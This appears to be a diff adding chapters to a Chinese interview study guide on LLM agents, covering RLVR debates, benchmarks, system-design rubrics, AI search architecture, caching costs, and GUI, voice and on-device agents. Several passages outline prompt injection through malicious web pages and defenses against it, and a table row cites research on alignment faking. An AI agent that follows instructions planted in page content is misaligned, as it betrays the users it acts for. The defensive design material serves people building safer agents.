 **范式跃迁。** 2024.9 的 o1 与 2025.1 的 DeepSeek-R1 把"推理"从提示技巧变成**可训练的潜思维链**，并证明一条新扩展律：在固定模型参数下，**投入更多推理时计算（test-time compute）可以稳定换取性能提升**（Snell et al. 2024，[arXiv:2408.03314](https://arxiv.org/abs/2408.03314)，给出 compute-optimal 分配：难题上"多想"比换更大的模型更划算）。此后 o3/o4-mini、R1 系列、以及所有 2025–2026 旗舰（GPT-5、Gemini 3、Claude 4.x）都把 reasoning 内化为默认模式，并以 **effort/thinking budget 旋钮**暴露给上层。
 
@@ -6900,9 +7210,11 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 | 记忆系统设计（检索三因子、MemGPT/Mem0/时序 KG、写入/读取时计算） | ⭐⭐ | 长程 agent 岗高频 |
 | reasoning/template collapse 与 agent 训练失败模式 | ⭐⭐ | 区分"用过"和"训过"的分水岭，MI vs 熵是前沿细节 |
 | 过程奖励（PRM）与 outcome-vs-process 取舍 | ⭐⭐ | RL 岗高频，PRM800K/Math-Shepherd 是标准引用 |
+| RLVR 能力边界之争（pass@k crossover vs ProRL） | ⭐⭐ | 研究岗新热点，两派证据 + 条件化结论是标准答法 |
 | 推理模型与 test-time scaling 的作用与边界 | ⭐⭐ | "为什么 reasoning model 是 agent 底座"的标准展开 |
 | 评测方法论（pass^k、预算对齐、METR 时间地平线） | ⭐⭐ | 资深岗的加分项，基准饱和话题的延伸 |
 | 多智能体研究谱系（CAMEL/MetaGPT/ChatDev/AgentVerse） | ⭐ | "读过哪些多 agent 论文"的抽查题 |
+| 科研/发现型 Agent（AlphaEvolve/AI co-scientist） | ⭐ | 研究岗新谈资，"evaluator 决定上限"是答题钥匙 |
 | 世界模型与 JEPA 路线之争 | ⭐ | 研究型/具身岗位高频，工程岗了解即可 |
 | Voyager 三组件与终身学习 | ⭐ | 常作为"读过哪些论文"的抽查题 |
 
@@ -7141,6 +7453,8 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 | Agent Q | 2024.8 | [2408.07199](https://arxiv.org/abs/2408.07199) | MCTS 生成轨迹 + DPO 离线更新 |
 | Agent-R | 2025.1 | [2501.11425](https://arxiv.org/abs/2501.11425) | 迭代自训练教会 agent 反思 |
 | Absolute Zero | 2025.5 | [2505.03335](https://arxiv.org/abs/2505.03335) | 零数据自博弈（proposer-solver + 解释器自验证） |
+| RLVR 边界质疑（Yue et al.） | 2025.4 | [2504.13837](https://arxiv.org/abs/2504.13837) | pass@k crossover：RLVR 提采样效率，上界受 base 限制 |
+| ProRL | 2025.5 | [2505.24864](https://arxiv.org/abs/2505.24864) | 长期稳定 RL + 参考策略重置，学出 base 采不出的新解 |
 | Kimi K2 | 2025.7 | [2507.20534](https://arxiv.org/abs/2507.20534) | 1T MoE 开源；大规模 agentic 数据合成 |
 | verl（HybridFlow） | 2024.9 | [2409.19256](https://arxiv.org/abs/2409.19256) | 主流 RL 训练框架 |
 | OpenRLHF | 2024.5 | [2405.11143](https://arxiv.org/abs/2405.11143) | 易用、可扩展 RLHF 框架 |
@@ -7191,7 +7505,8 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 | V-JEPA 2 | 2025.6 | [2506.09985](https://arxiv.org/abs/2506.09985) | 潜空间视频动力学 → 机器人零样本规划 |
 | Cosmos | 2025.1 | [2501.03575](https://arxiv.org/abs/2501.03575) | 面向物理 AI 的世界基础模型平台 |
 | RT-2 | 2023.7 | [2307.15818](https://arxiv.org/abs/2307.15818) | VLA 端到端策略的先河 |
-| π0 / π0.5 | 2024.10 | [2410.24164](https://arxiv.org/abs/2410.24164) | 视觉-语言-动作 flow model |
+| π0 | 2024.10 | [2410.24164](https://arxiv.org/abs/2410.24164) | 视觉-语言-动作 flow model |
+| π0.5 | 2025.4 | [2504.16054](https://arxiv.org/abs/2504.16054) | π0 的开放世界泛化（陌生真实环境长程任务） |
 | GR00T N1 | 2025.3 | [2503.14734](https://arxiv.org/abs/2503.14734) | 开放的通用人形机器人基础模型 |
 | Genie 3 | 2025.8 | deepmind.google 博客 | 720p/分钟级一致的可交互实时环境生成 |
 | Marble | 2025.11 | worldlabs.ai 博客 | 图像/文本生成可探索 3D 世界 |
@@ -7200,14 +7515,18 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 
 | 工作 | 时间 / Venue | arXiv / 来源 | 一句话贡献 |
 |---|---|---|---|
-| τ-bench | 2024.6 | [2406.12045](https://arxiv.org/abs/2406.12045) | tool-agent-user 交互基准（零售/航空域） |
-| τ²-bench | 2025.6 | [2506.07982](https://arxiv.org/abs/2506.07982) | 双控制 + telecom 域，正式提出 pass^k |
+| τ-bench | 2024.6 | [2406.12045](https://arxiv.org/abs/2406.12045) | tool-agent-user 交互基准（零售/航空域），提出 pass^k |
+| τ²-bench | 2025.6 | [2506.07982](https://arxiv.org/abs/2506.07982) | 双控制 + telecom 域，沿用并扩展 τ-bench 的 pass^k |
 | τ³-bench | 2026 | [2603.13686](https://arxiv.org/abs/2603.13686) | 全双工语音 + 知识任务，语音分仅约文本 30–45% |
 | GAIA | 2023.11 / ICLR 2024 | [2311.12983](https://arxiv.org/abs/2311.12983) | 概念简单、操作困难的通用助手基准 |
 | GAIA-2 / ARE | 2025.9 | [2509.17158](https://arxiv.org/abs/2509.17158) | 800 场景 × 10 universes，可控可复现（Meta FAIR） |
 | HLE（Humanity's Last Exam） | 2025.1 | [2501.14249](https://arxiv.org/abs/2501.14249) | 跨学科极限知识推理基准 |
 | BrowseComp | 2025.4 | [2504.12516](https://arxiv.org/abs/2504.12516) | 高难浏览检索基准 |
 | METR 时间地平线 | 2025.3 | [2503.14499](https://arxiv.org/abs/2503.14499) | 可靠完成任务时长按约 7 个月翻倍 |
+| GDPval | 2025.9 | OpenAI 官方 | 44 个职业的真实工作任务、行业专家盲评，前沿模型近半任务接近专家水平 |
+| MLE-bench | 2024.10 | [2410.07095](https://arxiv.org/abs/2410.07095) | 75 个 Kaggle 任务评测端到端 ML 工程能力 |
+| PaperBench | 2025.4 | [2504.01848](https://arxiv.org/abs/2504.01848) | 从零复现 20 篇 ICML 2024 论文全流程（理解→编码→实验） |
+| Project Vend | 2025.6 | anthropic.com 官方 | Claude 真实经营办公室小店的月级实验，长程经营的定性失败案例库（× Andon Labs） |
 | AgentDojo | 2024.6 | [2406.13352](https://arxiv.org/abs/2406.13352) | 注入攻防评测事实标准：效用与 ASR 联合度量 |
 | Spotlighting | 2024.3 | [2403.14720](https://arxiv.org/abs/2403.14720) | 定界/编码/数据标记的注入防御 |
 | Instruction Hierarchy | 2024.4 | [2404.13208](https://arxiv.org/abs/2404.13208) | 指令优先级训练，基座抗注入底座能力 |
@@ -7215,6 +7534,8 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 | Alignment Faking | 2024.12 | [2412.14093](https://arxiv.org/abs/2412.14093) | 模型策略性顺从的实验证据，审计风险来源 |
 | Agentic RL 综述 | 2025.9 | [2509.02547](https://arxiv.org/abs/2509.02547) | POMDP 形式化，500+ 工作的全景图 |
 | 自我进化 Agent 综述 | 2025.7 | [2507.21046](https://arxiv.org/abs/2507.21046) | 四阶段循环 × 进化对象分类框架 |
+
+> 上表中 GDPval、MLE-bench、PaperBench、Project Vend 与 2.6 节的 SWE-Lancer 同属一条新趋势线：评测正在从"解题能力"（基准通过率）走向"经济价值度量"——真实职业任务、行业专家盲评、美元计价的交付物，乃至月级真实经营的盈亏与定性失败案例。面试被问"基准饱和之后怎么评"，答完 pass^k/防污染/时间地平线，再补上这条"从 benchmark 到真实经济产出"的线，答案才完整。
 
 ---
 
@@ -7236,6 +7557,7 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 14. **长期记忆"存得越多越强"是错觉**。记忆价值 = 精确性 × 可检索性 × 新鲜度；不可信来源直接入库 = 一次注入永久污染；Mem0 与 Zep 的厂商基准互相矛盾，引用前先在自己数据上复现。
 15. **venue 与日期是面试硬伤高发区**：Voyager 是 **TMLR 2024**（不是 NeurIPS 2023）；R1 不是"纯 RL"（纯 RL 的是 R1-Zero，R1 是含 SFT 的四阶段流水线）；AAIF 由 **五家**（Anthropic/OpenAI/Block/Microsoft/Google）创立、A2A 并不在 AAIF 内。
 16. **test-time scaling 幂律递减**：难题上"多想"比换更大模型划算（Snell et al.），简单题上多烧 token 不经济——推理预算是产品旋钮，不是免费午餐。
+17. **RLVR 后 pass@1 涨 ≠ 能力边界扩了**：Yue et al. 证明大 k 下 base model 的 pass@k 可能反超（RLVR 收窄采样分布、提升采样效率）；但 ProRL 证明长期稳定 RL + 探索维持能在 base pass@k≈0 的任务上学出新解——下结论前先看训练时长与 k 取多大。
 
 ---
 
@@ -7384,6 +7706,19 @@ Agent 系统设计 & 综合实战
 - "成功的定义是什么？哪个业务指标归这个 agent 负责？"——防止做出"技术指标好看、业务不买账"的系统。
 
 **最常见的挂法**：跳过 ①② 直接画架构图。资深面试官会据此判断你在工作中也是"拿到需求就开干"。
+
+#### 同一道题的职级分层标尺：面试官到底在用什么尺子
+
+同一道"设计电商客服 Agent"，不同职级的及格线完全不同——搞清楚自己该答到哪一档，比多背一个架构模式更有用：
+
+| 职级 | 及格线表现 |
+|---|---|
+| P5（初级） | 给出正确的基本架构：RAG + 工具调用 + 转人工兜底，模块职责与数据流清楚 |
+| P6（资深） | 在此之上**主动**谈评估集怎么建、怎么灰度上线、给出粗粒度成本账 |
+| P7（专家） | 完整成本演算（含 caching / routing / 批处理的量化影响）、失败模式分类与对策、给出 SLO 承诺 |
+| Staff | 平台化视角：多租户治理、ROI 与"这题该不该用 agent 做"的判断、与安全/法务/业务团队的组织接口 |
+
+**面试官视角的红旗信号**：P5 红旗——模块间数据流说不清、把"接个大模型 API"当方案；P6 红旗——被问"怎么知道它变好了"才想起评估，降本只会一句"换便宜模型"；P7 红旗——成本算不到月度美元数量级、失败模式只有"加重试"；Staff 红旗——只谈技术不谈 ROI 与边界，或反过来全是愿景没有一处技术抓手。背后的规律：**每升一级，考察点就从"方案对不对"向"判断值不值、别人能不能用"移动一格**。低职级答出高一档内容是强加分；高职级只答低档内容，即使全对也会被降档。
 
 #### 2.2 第一道分水岭：Workflow 还是 Agent？
 
@@ -7626,7 +7961,7 @@ Lead Agent（强推理模型 + extended thinking）
 - **可靠性手段**：每一步截图回看验证动作是否生效、元素定位失败时降级重试、关键流程录制供回放调试。
 - **安全是这类 agent 的头号问题**：它同时暴露于 prompt injection（恶意网页内容即注入载荷）与误操作双重风险。必须：凭证保险箱（agent 拿不到原始密码，只拿到 scoped token）、域名/动作白名单、支付与发送类动作强制人工确认、隔离浏览器实例（不携带用户主会话 cookie）。
 - **支付与商务（2025–2026 新追问）**：比价下单类场景涉及替用户付款，了解 AP2 / x402 / ACP 三足鼎立的 agent 支付协议格局（详见 2.11），核心是"授权凭证（mandate）+ scoped 支付工具 + 不可逆动作人工确认"。
-- **评估**：OSWorld / WebArena / WebVoyager 一类真实环境基准；人类表现约 70%+ 而 agent 长期远低于此，说明这条路线的可靠性仍是开放问题——面试时承认这一点比吹嘘更可信。
+- **评估**：OSWorld / WebArena / WebVoyager 一类真实环境基准；截至 2025 年底，前沿模型在 OSWorld-Verified 上已达 60% 上下（人类基线约 72%），与人类的差距收窄到十个百分点量级——正确的表述是"能力已接近人类，但长尾可靠性（罕见 UI、多步错误恢复、UI 改版）仍是主要瓶颈"，面试时给出这个演进脉络比一句"远低于人类"更可信。
 
 **(b) 记忆型个人助理**（"帮我跟进这件事、下周提醒我、记住我的偏好"）：
 
@@ -7634,6 +7969,48 @@ Lead Agent（强推理模型 + extended thinking）
 - **主动性与打扰预算**：定时任务/cron 触发主动提醒时，要有"该不该现在打扰用户"的门控，否则助理变垃圾邮件机。
 - **隐私是一等约束**：记忆内容可见、可编辑、可一键删除（GDPR 被遗忘权）；绝不记忆密码/证件号等秘密；跨会话引用敏感信息前要确认语境。
 - **评估**：[LongMemEval](https://arxiv.org/abs/2410.10813) 一类长期记忆基准，考"信息抽取、跨会话整合、时间推理、知识更新、拒答（没记住就别说）"五类能力。
+
+**(c) 批处理 / 离线 pipeline Agent**（报告生成、批量标注、文档结构化三类典型负载）：
+
+- **与在线 agent 的架构反转**：在线 agent 延迟优先、逐请求优化；离线 pipeline 吞吐与单位成本优先。没有实时约束就应该反着设计：一律走 Batch API（约 5 折），敢用大上下文强模型换质量（反正没人在同步等待），并发度只受配额与预算约束。
+- **可靠性靠工程而非模型**：任务幂等分片（每片带确定性 ID，重跑无副作用）+ 断点续跑（进度持久化，挂了从检查点继续而非整批重来）；失败任务进重试队列重排队，多次失败进死信队列人工处理。
+- **质量闸门**：自动 QA 门禁（schema 校验、守恒/一致性检查、LLM judge 抽评）+ 按比例抽样人审；通过率跌破阈值时熔断整个批次，而不是继续产出垃圾。
+- 面试点睛："同一个模型，在线与离线场景的正确架构是两套。"成本细节（Batch API、缓存与量级估算）见第 10 章。
+
+##### （6）AI 搜索 / Answer Engine
+
+以 Perplexity 形态为原型。这道题近两年频率快速上升，因为它把检索工程、对抗环境、延迟工程、faithfulness 四件事拧在一起，并与内部 RAG 形成鲜明对照——语料是开放、对抗、时刻变化的 web。
+
+```
+用户 query
+    ▼
+Query 理解与改写（意图/时效性分类 → 纠错、归一化、分解为多个子查询）
+    ▼
+多路并行检索 ─┬─▶ Web search API（通用索引）
+              ├─▶ 垂直源（学术 / 新闻 / 商品 / 社区）
+              └─▶ 新鲜度路由：时效类 query 强制实时检索，绕过一切缓存
+    ▼
+抓取与净化（JS 渲染 → 正文抽取 → 去广告/模板噪声）→ 重排去重（含域名多样性约束）
+    ▼
+带引用流式合成（句子级引用标注，来源卡片先行渲染）
+    ▼
+Faithfulness 校验与引用回填（逐句核对"引用是否真的支持该论断"，错位则回填或降级删句）
+```
+
+**详设要点**：
+
+- **Query 理解是路由的总开关**：先分类——导航类/事实类/时效类/研究类，决定走哪条路径、哪档模型；改写把口语 query 变成多个高召回子查询并行发出；时效性判断（"昨晚比赛结果" vs "什么是注意力机制"）决定是否旁路缓存强制实时检索。
+- **对抗面是与内部 RAG 的本质区别**：开放 web 上有 SEO spam、内容农场、AI 生成的低质套壳站。防御分层：检索层用域名信誉分与质量分类器降权，合成层要求多信源交叉印证（单一低质源不足以支撑论断），校验层引用核对兜底。可点一句：AI 生成内容正在充斥 web，这条对抗线只会越来越重。
+- **延迟工程**：用户对"搜索"的耐心以秒计。多路检索必须并行（总检索延迟 = 最慢一路而非求和，配超时降级）；合成用流式输出让首屏尽快出字（TTFT 目标 1–2 s 量级）；产品上分"快答"与"深研"两档——快答用小模型单轮合成，深研走 Deep Research 式多 agent（见 2.6(3)），把重活从同步路径挪走。
+- **缓存分层**：热点 query 呈幂律分布，缓存是省钱第一杠杆。第一层归一化 query 精确缓存（大小写/空格/同义改写归一）；第二层语义缓存（embedding 相似度超阈值即命中，需防"相似但意图不同"的误命中）；第三层抓取内容缓存（同一 URL 的净化正文复用）。每层都要带新鲜度失效策略，时效类 query 直接旁路。
+- **成本账**：每查询成本 = 检索 API（按调用计费）+ 抓取渲染 + LLM 合成（token 大头，上下文塞了多篇净化正文）。分层是核心手段：大部分流量走缓存命中或快答小模型，少数走深研强模型——这是 2.7 的 model cascade 在搜索场景的实例。
+- **评测**：**引用精确率**（被引来源确实支持该论断的比例）与**引用覆盖率**（应有引用的论断中带引用的比例）是这类产品的一等指标；**freshness**（时效类 query 答案是否最新）单独建集测；端到端可参考 SimpleQA（短事实问答准确率与拒答校准）、BrowseComp（高难度浏览检索）一类基准，再加人工 side-by-side 对比。
+
+**追问预判**：
+
+1. "突发热点事件怎么办？"——新鲜度路由识别时效 query 旁路缓存；热点检测后主动预取 + 结果短 TTL 共享，把尖峰的重复计算合并。
+2. "引用是编的怎么办？"——生成时句级 grounding + 独立校验轮回填；校验不过的句子宁可删掉或降级为"未经证实"（与 Q18 同一原理）。
+3. "这和公司内部 RAG 有什么区别？"——语料从可治理变成开放对抗、新鲜度从可选变成硬约束、引用从加分项变成产品承诺；架构上多出对抗过滤与新鲜度路由两个内部 RAG 没有的层。
 
 #### 2.7 成本、延迟与 token 估算
 
@@ -7643,7 +8020,7 @@ Lead Agent（强推理模型 + extended thinking）
 2. **成本 = token × 单价 × 量级**。例：日均 10 万会话 × 200k input token × $3/M ≈ $60k/天——算出这个数字后你自然会主动提出 routing 到小模型和 prompt caching，这就是面试官要的"成本驱动设计"。
 3. **四大降本杠杆**（按优先级）：
    - ① **Routing / model cascade**（80% 流量走小模型）——第一大杠杆；
-   - ② **Prompt caching**：把稳定的 system prompt、工具定义、知识库前缀做成缓存。Anthropic 缓存命中部分约为正常输入价的 10%（省 90%），但**写入有溢价**：5 分钟 TTL 写入为基础输入价的 1.25×、1 小时 TTL 为 2×，因此同一前缀在窗口内被使用 ≥2 次（首写 + 命中 1 次；1h TTL 需 ≥3 次）才净赚——TTL 选择取决于前缀复用频率；OpenAI 自动缓存无写入溢价但折扣只有 50%。两家共同前提是前缀字节级稳定，动态内容放最后；
+   - ② **Prompt caching**：把稳定的 system prompt、工具定义、知识库前缀做成缓存。Anthropic 缓存命中部分约为正常输入价的 10%（省 90%），但**写入有溢价**：5 分钟 TTL 写入为基础输入价的 1.25×、1 小时 TTL 为 2×，因此同一前缀在窗口内被使用 ≥2 次（首写 + 命中 1 次；1h TTL 需 ≥3 次）才净赚——TTL 选择取决于前缀复用频率；OpenAI 自动缓存无写入溢价，折扣分代际：4o 一代约 50%，GPT-5 一代已到约 90%（缓存输入约为正常价的 1/10）。新旗舰上两家折扣已同量级，选型差异点不再是折扣率，而是**显式断点 vs 自动命中**：Anthropic 用 cache_control 显式标记断点（可控性强、可选 TTL，但要自己核算写入溢价的盈亏），OpenAI 按前缀自动命中（零配置、无写入溢价，但命中与否不可显式控制）。两家共同前提是前缀字节级稳定，动态内容放最后；
    - ③ **批处理 / 异步化**：两家 Batch API 均约 5 折，不要求实时的任务（报告生成、批量标注）一律走批处理；
    - ④ 压缩历史、砍冗余检索、限制 worker 预算。
 4. **延迟 = Σ(各轮 TTFT + 生成时间)**，串行循环是延迟杀手，并行 worker 是主要对冲手段（Anthropic 实测降最多 90%）；面向用户的链路用流式输出改善体感。
@@ -7669,8 +8046,8 @@ Lead Agent（强推理模型 + extended thinking）
 | [τ²-bench](https://arxiv.org/abs/2506.07989) | 双控客服 | 在 τ-bench 上引入 dual-control：用户侧与 agent 侧都可由 LLM/人操控，更接近真实人机混合场景 |
 | BrowseComp | 深度浏览调研 | OpenAI 出品，专测"翻遍全网才找得到"的问题 |
 | Vending-Bench（2） | 长时程商业运营 | 让 agent 以模拟时间经营自动售货机生意数月，考察长程规划、连贯性与盈利能力 |
-| OSWorld | 计算机操作 | 真实桌面环境，369 个任务，人类基线约 72% |
-| WebArena | 浏览器操作 | 自托管网站环境（电商/Wiki/论坛等），812 个任务，人类基线约 78%；agent 可靠性仍远低于人类 |
+| OSWorld | 计算机操作 | 真实桌面环境，369 个任务，人类基线约 72%；前沿模型在 OSWorld-Verified 上 2025 年底已达 60% 上下，差距收窄到十个百分点量级 |
+| WebArena | 浏览器操作 | 自托管网站环境（电商/Wiki/论坛等），812 个任务，人类基线约 78%；agent 已接近人类但长尾可靠性仍是主要瓶颈 |
 | [HAL](https://arxiv.org/abs/2510.11977) | 跨基准统一榜单 | 普林斯顿主导的 Holistic Agent Leaderboard，统一 harness、可复现、抑制"各家自报家门" |
 | [AgentDojo](https://arxiv.org/abs/2406.13352) / InjectAgent | 注入攻防 | 联合度量"攻击下的任务效用"与攻击成功率（ASR），agent 安全评测的事实标准 |
 | LongMemEval | 长期记忆 | 记忆抽取/整合/时间推理/更新/拒答 |
@@ -7944,7 +8321,7 @@ Lead Agent（强推理模型 + extended thinking）
 - 主循环：看截图/accessibility tree → 决策 → 执行点击/输入 → 回看验证是否生效 → 失败降级重试；用 DOM/accessibility tree 优先于纯视觉定位以降本增稳；
 - 可靠性：UI 改版即失效是常态，关键流程要能录制回放、按步骤断言；设置步数与时间上限，卡住时上报而非死磕；
 - 安全（得分重心）：① prompt injection——第三方网页内容本身就是不可信注入载荷，页面文本永不提权为指令，跨页面携带数据前做隔离；② 凭证保险箱：agent 拿不到原始密码，只拿站点 scoped session，且会话与用户主浏览器隔离（不携带主会话 cookie）；③ 支付/发送/提交类终态动作强制人工确认；④ 域名白名单 + 下载文件沙箱；
-- 评估：OSWorld/WebArena 式真实环境任务集 + 自建站点回归集（UI 一改版就跑）；人类基线约 70%+，诚实承认 agent 可靠性仍有差距，产品上用"人在环确认"兜底；
+- 评估：OSWorld/WebArena 式真实环境任务集 + 自建站点回归集（UI 一改版就跑）；人类基线约 72–78%，前沿模型已接近（OSWorld-Verified 约 60% 上下），但长尾可靠性仍有差距，产品上用"人在环确认"兜底；
 - 成本：每步截图入 context，成本远高于 API 通道——这也是"API 优先"的成本理由。
 
 #### Q13 ⭐⭐⭐【进阶】MCP 是什么？和传统 function calling 有什么区别？接入第三方 MCP server 有哪些安全风险？
@@ -8143,6 +8520,8 @@ Lead Agent（强推理模型 + extended thinking）
 
 第 1–12 章分别讲了提示词、记忆、工具、多智能体、评估、安全、部署——但在真实系统里，这些从来不是"独立模块"，而是同一个**包裹层（harness）**的不同切面：它们在运行时彼此耦合，共同决定一个长程 agent 是否可控、可检查、可恢复。本章是全书的"统一元框架"：以 2026 年的综述《Agent Harness Engineering: A Survey》（TMLR under review，anonymous，64 页，映射 170+ 开源项目，配两张架构图：四层心智模型 + 推理/运维工程清单）为主干，把散落在各章的 harness 关切串成一个**控制系统视角**——模型是被控对象，harness 是控制器 C_H，评估分数是闭环系统的联合属性。面试中，能把"我用了 LangGraph + 加了 guardrail"上升为"我在 ETCLOVG 的每一层做了什么决策、承担了什么代价"的人，才是资深岗想要的候选人。
 
+> ⚠️ **单一来源风险提示** — 本章框架主干出自《Agent Harness Engineering: A Survey》（TMLR under review、匿名投稿，外部暂不可检索），其中 SandboxEscapeBench、Bölük et al.、Kim et al. 等内部引用目前无法独立核实。面试中引用本章结论时，**落点放在工程逻辑本身**（分层为何如此划分、权衡为何成立），而非"某综述说"；数据类断言（如治理层覆盖普遍稀疏）请作为定性观察转述，不要当硬数据报出。
+
 ### 一、知识图谱
 
 ```
@@ -8282,6 +8661,22 @@ ETCLOVG 是综述提出的七层职能框架：**E**xecution、**T**ooling、**C
 **V — Verification（验证/评估）。** V 层的一等公民化带来一个闭环命题：**评估结果必须回流（feed back）改进 harness 本身**——offline eval 发现的回归、online eval 发现的漂移，都要能落到具体的层和具体的 hook 上，否则评估就只是发榜。这也引出 2.6 的 coupling 问题：回流之前先搞清楚分数变了是模型的功劳还是控制器的功劳。**交叉引用：本书第 8 章（offline/online 评估、trajectory eval、pass^k）。**
 
 **G — Governance（治理/安全）。** G 层分**三个子层**：**model-level**（guardrails、输入输出过滤器）、**system-level**（LLM 网关、代理、运行时权限模型）、**organizational-level**（审计、合规、HITL 人工批准）。G 层的"手脚"是工具循环的**四个 hook 点**（见 2.5）。综述用两份表格给出冷酷的现实检查：风险 taxonomy（Kim et al. 2026，Table 3）很全，但各开源项目对风险的**覆盖普遍稀疏**（Table 4）——结论是**治理在实践中常沦为事后补丁**，而非设计之初的架构决策。**交叉引用：本书第 9 章（guardrails 三层、权限模型、HITL 的审批疲劳）。**
+
+#### 把 ETCLOVG 翻译成通用工程语言
+
+ETCLOVG 是一篇匿名在审综述的私有术语，**外部面试官大概率没听过**。逐层翻译成业界通用词汇：
+
+| 层 | 综述术语 | 通用工程语言（面试首选） |
+|---|---|---|
+| E | Execution | 沙箱与执行环境 |
+| T | Tooling | 工具接口层 |
+| C | Context | 上下文管理 |
+| L | Lifecycle | 状态与生命周期（持久化/恢复） |
+| O | Observability | 可观测性 |
+| V | Verification | 评估与验证 |
+| G | Governance | 权限与治理 |
+
+**面试策略三条：** ① **外部面试先用右列通用词汇作答**——被问"生产级 agent 要考虑什么"，直接说"沙箱隔离、工具接口、上下文管理、状态持久化与恢复、可观测性、评估验证、权限治理"七个方面，每个词面试官都能对上自己的知识体系；开口报"ETCLOVG"反而要先花时间解释缩写，且对方无从校验。② **把七层当成自己的检查清单，而非答题话术**——它的价值是帮你在脑内快速过一遍"哪层还没答到"，保证覆盖度与条理，而不是当术语抛出去镇场。③ **只有对方追问"你有没有系统化的框架"时再引出**，并如实注明出处是一篇匿名在审的综述（TMLR under review）——主动交代来源的不确定性，比让面试官事后搜不到这个词更显专业。最后一层保险：右列七个词各自对应本书第 9/10、5、2/4、3/7、8、8、9 章的成熟内容，就算全程不提 ETCLOVG，答案深度也不受影响——框架是组织答案的骨架，不是答案本身。
 
 #### 2.4 控制流谱系：Loop vs Graph，Code/LLM/Hybrid，三种系统形态
 
@@ -8473,5 +8868,261 @@ ETCLOVG 是综述提出的七层职能框架：**E**xecution、**T**ooling、**C
 
 ---
 
+
+# 第 14 章 · 应用形态专题：GUI·浏览器、语音与端侧 Agent
+
+前 13 章沿"技术栈"横向展开：模型、上下文、工具、记忆、多智能体、评估、安全、部署、harness。本章（2026 修订新增）换一个"纵切"视角，聚焦三个已经长成一级知识域、并各自分化出独立岗位方向的**应用形态**：GUI/浏览器 Agent、语音 Agent、端侧 Agent。三者的共同点是把 Agent 从"文本进文本出"的舒适区推向真实物理与产品约束——连续动作空间与有损观察（GUI）、毫秒级实时交互（语音）、内存带宽与平台权限（端侧）——因此每个形态都催生了自己的表征方案、延迟工程、评测基准与安全边界。2025 下半年浏览器原生产品潮（Atlas / Comet / Claude for Chrome）、语音客服的规模化商用与 Apple Intelligence 的端云分层，标志着这三条线在 2026 年的面试中已从"加分项"变成"专场题"。本章内容与 1–13 章大量互指：评测方法呼应第 8 章、注入防护呼应第 9 章、推理性能呼应第 10 章、SLM 路线呼应第 11 章——读的时候请把它当作前面技术栈在三个具体形态上的"落地检验"。
+
+### 一、知识图谱
+
+```
+应用形态专题
+├── 1. GUI / 浏览器 Agent
+│   ├── 执行模型：screenshot→推理→action 闭环（等待确认 / 循环检测 / 步数预算）
+│   ├── 输入表征三路线：纯视觉截图 / DOM·AX tree / 混合 + Set-of-Marks
+│   ├── Grounding：语义意图→坐标/元素映射（第一大失败来源；ScreenSpot / ScreenSpot-Pro）
+│   ├── 模型与产品主线：Claude computer-use → OpenAI CUA/Operator → ChatGPT Agent；UI-TARS 原生模型路线
+│   ├── 评测：OSWorld（事实标准）/ WebArena / VisualWebArena / WebVoyager / AndroidWorld
+│   ├── 浏览器宿主化（2025H2）：ChatGPT Atlas / Perplexity Comet / Claude for Chrome / Gemini in Chrome
+│   ├── 移动端谱系：AppAgent → Mobile-Agent → AutoGLM；Accessibility API vs ADB
+│   └── 安全：lethal trifecta 全凑齐；隔离实例 / 凭证保险箱 / 终态确认 / 域白名单（详见第 9 章）
+├── 2. 语音 Agent
+│   ├── 两条路线：级联式 ASR→LLM→TTS vs 端到端 Speech-to-Speech（Realtime API / Gemini Live）
+│   ├── 延迟工程：四段预算（VAD 判停 / ASR 尾包 / LLM TTFT / TTS 首块）＋流式三级并行＋垫话
+│   ├── 交互难点：语义判停 vs 能量 VAD；barge-in 三连；backchannel 过滤；全双工（Moshi）
+│   ├── 能力现实：τ³-bench 语音成绩约为文本 30–45%（见第 8 章）
+│   └── 生态：Pipecat / LiveKit Agents（编排）；Vapi / Retell（托管）；PSTN 8kHz 与 Twilio Media Streams
+└── 3. 端侧 / On-device Agent
+    ├── 三重红利：隐私（唯一云端不可替代）/ 延迟与离线可用 / 边际成本趋零
+    ├── 根本约束：与云端旗舰约两个数量级参数差距 → 重新划分任务边界
+    ├── 推理栈：llama.cpp / MLX / ExecuTorch / MNN / ONNX Runtime；NPU（ANE / Hexagon）
+    ├── 内存带宽墙：decode 是 memory-bound；4-bit 量化默认；KV cache 与系统争 RAM
+    ├── 端云协同：Apple Intelligence 分层 + Private Cloud Compute；路由与第 10 章模型级联同构
+    └── 权限通道：Android Accessibility vs Apple App Intents vs 纯视觉；权限与生态比算力更硬
+```
+
+---
+
+### 二、核心概念精讲
+
+#### 2.1 GUI Agent 的执行模型：screenshot→推理→action 闭环
+
+GUI Agent 的基本执行模型是一个闭环：每一步截取当前屏幕（或读取页面结构），模型推理出下一个原子动作——click(x,y)、type(text)、scroll、按键、拖拽——执行后重新观察，直到任务完成或触达步数/成本上限。与代码 Agent 的本质区别在于：动作作用于**环境状态**而非文本缓冲区，错一步不可轻易回滚；观察还是有损的（截图看不到隐藏状态与异步加载）。因此工程上必须显式处理三件事：动作后的**等待与状态确认**（页面加载完没有、点击是否生效）、**循环检测**（同一动作反复失败时跳出）、**步数与预算控制**。
+
+#### 2.2 输入表征三路线与 Set-of-Marks
+
+1. **纯视觉截图**：只喂截图，模型直接输出屏幕坐标。通用性最强——桌面原生应用、Canvas、跨平台界面通吃，Claude computer-use 与 UI-TARS 均属此线；代价是定位完全依赖模型视觉能力，分辨率与 DPI 缩放都会引入误差。
+2. **DOM / accessibility tree**：把网页 DOM 或系统无障碍树序列化给模型，动作以元素句柄下发（click(node_id)）。定位精确、可 headless、便于程序化校验；但只覆盖结构可得的界面——Canvas/WebGL、跨域 iframe、多数桌面应用无从下手；真实页面 DOM 动辄数万 token，必须裁剪，裁剪又丢信息；且渲染结果与 DOM 可能不一致（元素被遮挡、CSS 隐藏）。
+3. **混合 + Set-of-Marks（SoM）**：用 AX tree/DOM 枚举可交互元素，在截图上叠加编号框，模型输出"点击 [23]"。本质是把 grounding 从**坐标回归降维成编号分类**，大幅降低定位错误；代价是标注管线本身会漏标/错标，密集界面上编号互相遮挡，动态刷新还会导致编号漂移（需每步重标注）。
+
